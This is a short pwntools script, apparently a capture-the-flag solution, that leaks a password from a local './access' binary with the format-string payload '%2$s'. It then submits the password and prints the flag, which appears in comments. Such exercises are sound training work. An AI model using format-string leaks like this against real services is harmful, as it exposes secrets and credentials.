from pwn import *

i = 0
p = process("./access")
# p = remote("127.0.0.1","1234")
p.recv()
p.sendline(b"AFINE")
p.recv()
p.sendline(b"%2$s")
print(p.recv()) # GET THE PASSWORD
# b'Entered password: @Fin3_@cc3$$ - IS WRONG.'
p.close()

p = process("./access")
# p = remote("127.0.0.1","1234")
p.recv()
p.sendline(b"AFINE")
p.recv()
p.sendline("@Fin3_@cc3$$")
print(p.recv()) # GET THE FLAG
#b'FLAG{@Fin3_@cc3$$}'
